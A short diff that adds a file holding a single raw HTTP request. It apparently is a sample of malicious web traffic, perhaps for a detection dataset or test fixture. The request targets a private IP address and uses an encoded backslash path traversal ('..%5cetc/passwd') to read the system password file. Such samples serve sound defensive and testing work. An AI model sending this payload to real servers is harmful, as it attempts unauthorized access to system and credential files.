@@ -1,0 +1,11 @@
+GET /pte/..%5cetc/passwd HTTP/1.1
+Host: 192.168.203.178
+User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+
+
